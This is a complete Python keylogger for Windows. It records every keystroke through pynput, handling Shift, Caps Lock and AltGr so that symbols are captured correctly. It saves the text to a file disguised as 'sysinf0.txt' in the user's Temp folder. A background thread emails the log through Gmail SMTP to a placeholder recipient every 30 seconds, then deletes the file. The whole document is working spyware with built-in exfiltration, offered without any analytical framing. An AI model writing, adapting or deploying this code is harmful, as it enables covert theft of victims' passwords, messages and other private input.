import threading
from pynput.keyboard import Listener,Key
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import os
import time


KeyList = list()
CapsLock = False
ShiftKey = False
AltGrKey = False

AltGrList = ["}", ">", "£", "#", "$", "½", "", "{", "[", "]"]
ShiftKeyList = ["=", "!", "'", "^", "+", "%", "&", "/", "(", ")"]
Numbers = "0123456789"

def main():

    def Press(key):

        global KeyList,CapsLock,ShiftKey,AltGrKey

        try:

            if ShiftKey:
                if key.char in Numbers:
                    KeyList.append(ShiftKeyList[int(key.char)])

                else:

                    if key.char == "*":
                        KeyList.append("?")

                    elif key.char == "-":
                        KeyList.append("_")

                    elif not CapsLock:
                        KeyList.append(key.char.upper())

                    else:
                        KeyList.append(key.char)


            elif AltGrKey:
                if key.char in Numbers:
                    KeyList.append(AltGrList[int(key.char)])

                else:
                    if key.char == "*":
                        KeyList.append("\\")
                    if key.char == "-":
                        KeyList.append("|")
                    if key.char == "q":
                        KeyList.append("@")

            elif CapsLock:
                KeyList.append(key.char.upper())
            else:
                KeyList.append(key.char)

        except AttributeError:
            if key ==  Key.space:
                KeyList.append(" ")
            if key == Key.enter:
                KeyList.append("\n")
            if key == Key.backspace:
                KeyList.append("'<-'")


            if key == Key.caps_lock:
                CapsLock = not CapsLock

            if key == Key.shift_r or key == Key.shift_l:
                ShiftKey = True

            if key == Key.alt_gr:
                AltGrKey = True


        if len(KeyList) >= 10:
            WriteFile()
            KeyList = list()


    def Release(key):

        global ShiftKey,AltGrKey

        if key == Key.shift_l or key == Key.shift_r:
            ShiftKey = False

        if key == Key.alt_gr:
            AltGrKey = False


    def WriteFile():

        global KeyList

        username = os.getlogin()

        with open("C:/Users/"+username+"/Appdata/Local/Temp/sysinf0.txt","a",encoding = "utf-8") as file:

            for x in KeyList:
                file.write(x)

    with Listener(on_press=Press,on_release=Release) as listener:
        listener.join()

def SendMail():

    while 1:

        time.sleep(30)

        username = os.getlogin()

        Location = "C:/Users/"+username+"/Appdata/Local/Temp/sysinf0.txt"

        try:
            if os.path.getsize(Location) >= 500:

                with open(Location,"r",encoding = "utf-8") as file:
                    Content = file.read()


                Structure = MIMEMultipart()

                Structure["From"] = "EnterSenderMail@gmail.com"
                Structure["To"] = "EnterRecipientMail@gmail.com"
                Structure["Subject"] = "KeyLogs"

                Text = MIMEText(Content,"plain")

                Structure.attach(Text)

                server = smtplib.SMTP("smtp.gmail.com",587)

                server.ehlo()

                server.starttls()

                server.login("EnterUsername","EnterPassword")

                server.sendmail("EnterSenderMail@gmail.com","EnterRecipientMail@gmail.com",Structure.as_string())

                server.close()

                os.remove(Location)

        except:

            pass


t1 = threading.Thread(target = main)
t2 = threading.Thread(target = SendMail)

t1.start()
t2.start()